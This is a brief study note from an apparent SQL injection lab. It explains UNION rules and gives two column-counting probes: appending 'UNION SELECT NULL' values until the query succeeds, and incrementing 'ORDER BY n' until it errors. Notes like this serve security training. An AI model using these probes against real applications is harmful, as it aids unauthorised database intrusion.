SQLi - Product category filter

End goal: Determine the number of columns return by the query

Background (Union):

table1        table2
a  |  b        c  |  d
-------        -------
1  ,  2        2  ,  3
3  ,  4        4  ,  5

Query #2: select a, b from table1 UNION select c, d from table2
1,2
3,4
2,3
4,5

Rule:
- The number and order of the columns must be the same in all queries
- The data types must be compatible

SQLi attack (way #1):
select ? from table 1 UNION select NULL
-error -> incorrect number of columns

select ? from table1 UNION select NULL, NULL, NULL
-200 response code -> correct number of columns

SQLi attack (way #2):

select a, b from table1 ORDER BY 3
-> error at ORDER BY n => (n-1) is the number of columns
